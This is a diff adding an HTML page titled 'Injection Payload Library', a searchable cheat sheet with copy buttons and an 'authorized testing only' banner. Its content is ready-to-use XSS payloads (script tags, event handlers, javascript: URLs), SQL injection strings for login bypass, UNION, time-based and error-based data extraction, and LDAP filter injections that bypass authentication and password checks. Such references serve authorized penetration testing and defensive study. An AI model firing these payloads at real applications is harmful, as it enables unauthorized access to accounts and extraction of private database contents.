@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Injection Payload Library</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --accent: #3b82f6;
+            --muted: #94a3b8;
+            --danger: #ef4444;
+            --success: #10b981;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: #f1f5f9;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #334155;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            color: var(--muted);
+            font-size: 1.1rem;
+        }
+        
+        .warning-banner {
+            background: #f59e0b;
+            color: #000;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .search-box {
+            background: var(--card);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            gap: 10px;
+        }
+        
+        .search-box input {
+            flex: 1;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            background: #0f172a;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .category {
+            background: var(--card);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .category h2 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #334155;
+            font-size: 1.5rem;
+        }
+        
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .payload-item {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 15px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .payload-item:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.1);
+        }
+        
+        .payload-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .payload-name {
+            font-weight: 600;
+            color: #e2e8f0;
+        }
+        
+        .copy-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #2563eb;
+        }
+        
+        .copy-btn.copied {
+            background: var(--success);
+        }
+        
+        .payload-code {
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: var(--muted);
+            background: #1e293b;
+            padding: 10px;
+            border-radius: 6px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .payload-desc {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #334155;
+            color: var(--muted);
+            font-size: 14px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--success);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+        }
+        
+        @media (max-width: 768px) {
+            .payload-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="logo.png" style="width: 100px; height: 100px;" alt="">
+            <h1>Injection Payload Library</h1>
+            <div class="subtitle">XSS, SQL Injection & LDAP Injection Payloads</div>
+        </header>
+        
+        <div class="warning-banner">
+            ⚠️ FOR AUTHORIZED TESTING ONLY - Use responsibly in controlled environments
+        </div>
+        
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search payloads...">
+        </div>
+        
+        <!-- XSS Payloads -->
+        <div class="category">
+            <h2>🛡️ XSS Payloads</h2>
+            <div class="payload-grid" id="xss-payloads">
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Basic Script Tag</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                    <div class="payload-desc">Basic script tag injection</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Quote Break</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                    <div class="payload-desc">Breaks out of attribute quotes</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Image Error</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;img src=x onerror=alert(1)&gt;</div>
+                    <div class="payload-desc">Uses image onerror event</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">SVG Load</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;svg/onload=alert('XSS')&gt;</div>
+                    <div class="payload-desc">SVG onload event</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Body Load</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;body onload=alert('XSS')&gt;</div>
+                    <div class="payload-desc">Body onload event</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">JavaScript URL</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">javascript:alert('XSS')</div>
+                    <div class="payload-desc">JavaScript protocol in URLs</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">CharCode Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">';alert(String.fromCharCode(88,83,83))//</div>
+                    <div class="payload-desc">CharCode encoding bypass</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">IFrame</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;iframe src="javascript:alert(1)"&gt;</div>
+                    <div class="payload-desc">IFrame with JavaScript source</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Object Tag</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">&lt;object data="javascript:alert(1)"&gt;</div>
+                    <div class="payload-desc">Object tag injection</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SQL Injection Payloads -->
+        <div class="category">
+            <h2>🗃️ SQL Injection Payloads</h2>
+            <div class="payload-grid" id="sqli-payloads">
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Basic Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">' OR '1'='1</div>
+                    <div class="payload-desc">Basic authentication bypass</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Comment Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">' OR 1=1--</div>
+                    <div class="payload-desc">Using SQL comments</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Admin Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">admin'--</div>
+                    <div class="payload-desc">Admin login bypass</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Union Select</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">1' UNION SELECT NULL, version(), user()--</div>
+                    <div class="payload-desc">Union-based data extraction</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Time Delay</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">' AND SLEEP(5)--</div>
+                    <div class="payload-desc">MySQL time-based blind</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">MSSQL Delay</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">'; WAITFOR DELAY '0:0:5'--</div>
+                    <div class="payload-desc">MSSQL time-based blind</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Parentheses Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">admin') OR ('1'='1</div>
+                    <div class="payload-desc">Bypasses parentheses in queries</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Table Enumeration</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">' UNION SELECT table_name FROM information_schema.tables--</div>
+                    <div class="payload-desc">Enumerates database tables</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Error Based</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--</div>
+                    <div class="payload-desc">MySQL error-based extraction</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- LDAP Injection Payloads -->
+        <div class="category">
+            <h2>📋 LDAP Injection Payloads</h2>
+            <div class="payload-grid" id="ldap-payloads">
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Wildcard Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">*)(&amp;)</div>
+                    <div class="payload-desc">Basic wildcard injection</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Always True</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">(&(user=*))</div>
+                    <div class="payload-desc">Always true condition</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Admin Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">admin*)(uid=*))(|(uid=*</div>
+                    <div class="payload-desc">Admin authentication bypass</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Object Class</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">admin)(&amp;(objectClass=*))</div>
+                    <div class="payload-desc">Object class injection</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Single Wildcard</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">*</div>
+                    <div class="payload-desc">Simple wildcard match all</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">CN Injection</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">*)(&amp;(cn=admin))</div>
+                    <div class="payload-desc">Common name injection</div>
+                </div>
+                
+                <div class="payload-item">
+                    <div class="payload-header">
+                        <div class="payload-name">Password Bypass</div>
+                        <button class="copy-btn">Copy</button>
+                    </div>
+                    <div class="payload-code">)(&amp;(userPassword=*))(|(uid=*</div>
+                    <div class="payload-desc">Password field injection</div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            Injection Payload Library • For Authorized Security Testing Only
+        </footer>
+    </div>
+    
+    <div class="notification" id="notification">Payload copied to clipboard!</div>
+    
+    <script>
+        // Copy functionality
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('copy-btn')) {
+                const button = e.target;
+                const payloadCode = button.closest('.payload-item').querySelector('.payload-code').textContent;
+                
+                navigator.clipboard.writeText(payloadCode).then(() => {
+                    // Show notification
+                    const notification = document.getElementById('notification');
+                    notification.style.display = 'block';
+                    setTimeout(() => {
+                        notification.style.display = 'none';
+                    }, 2000);
+                    
+                    // Change button text temporarily
+                    const originalText = button.textContent;
+                    button.textContent = 'Copied!';
+                    button.classList.add('copied');
+                    
+                    setTimeout(() => {
+                        button.textContent = originalText;
+                        button.classList.remove('copied');
+                    }, 1500);
+                });
+            }
+        });
+        
+        // Search functionality
+        const searchInput = document.getElementById('searchInput');
+        searchInput.addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            const payloadItems = document.querySelectorAll('.payload-item');
+            
+            payloadItems.forEach(item => {
+                const payloadName = item.querySelector('.payload-name').textContent.toLowerCase();
+                const payloadCode = item.querySelector('.payload-code').textContent.toLowerCase();
+                const payloadDesc = item.querySelector('.payload-desc').textContent.toLowerCase();
+                
+                if (payloadName.includes(searchTerm) || payloadCode.includes(searchTerm) || payloadDesc.includes(searchTerm)) {
+                    item.style.display = 'block';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        });
+        
+        // Add some interactive effects
+        document.querySelectorAll('.payload-item').forEach(item => {
+            item.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-2px)';
+            });
+            
+            item.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0)';
+            });
+        });
+    </script>
+</body>
+</html>
